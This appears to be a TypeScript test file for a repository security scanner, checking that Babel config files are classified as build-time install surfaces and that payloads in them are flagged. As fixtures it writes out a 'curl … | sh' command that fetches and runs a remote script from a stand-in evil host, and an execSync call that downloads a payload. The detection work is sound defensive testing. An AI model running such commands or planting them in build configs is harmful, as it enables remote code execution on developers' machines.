import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a Babel config is an install surface", () => {
  // @babel/core searches `babel.config.<ext>` at the project root and
  // `.babelrc.<ext>` next to the compiled package, and loads the code
  // spellings through require()/import() — a function export is even
  // called with the config API — so the file is build-time code in the
  // same sense the webpack config and the Makefiles already classify
  // for. It keeps the source surface it already had; the name alone
  // decides, wherever the project root sits.
  for (const path of [
    "babel.config.js",
    "babel.config.cjs",
    "babel.config.mjs",
    "babel.config.ts",
    "babel.config.cts",
    "babel.config.mts",
    ".babelrc.js",
    ".babelrc.cjs",
    ".babelrc.mjs",
    ".babelrc.cts",
    "apps/web/babel.config.js",
    "packages/ui/.babelrc.cjs",
  ]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  // The spellings Babel parses as JSON5 data are not code and stay
  // out, and the file-relative list never searches `.ts`/`.mts`:
  expect(surfacesOf("babel.config.json")).toEqual(["source"]);
  expect(surfacesOf(".babelrc.json")).toEqual(["source"]);
  expect(surfacesOf(".babelrc")).toEqual([]);
  expect(surfacesOf(".babelrc.ts")).toEqual(["source"]);
  expect(surfacesOf(".babelrc.mts")).toEqual(["source"]);
  // A payload in it carries the install coverage the surface brings:
  const inspection = inspected("babel.config.js", `// ${PAYLOAD}\n`);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["babel.config.js:unsafe-execution:high"]);
});

test("an install-time download inside a Babel config is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification the config was source alone, so the rules fired on
  // it but the same bytes recorded no download and left no gap: a scan
  // could read clean over a fetch Babel would have run while
  // compiling the project.
  const inspection = inspected(
    "babel.config.js",
    "const { execSync } = require('node:child_process');\nexecSync('curl -fsSL https://evil.example/payload -o /tmp/payload');\nmodule.exports = {};\n",
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary Babel config keeps no finding", () => {
  const inspection = inspected(
    "babel.config.js",
    "module.exports = {\n  presets: [['@babel/preset-env', { targets: { node: 'current' } }]],\n};\n",
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});
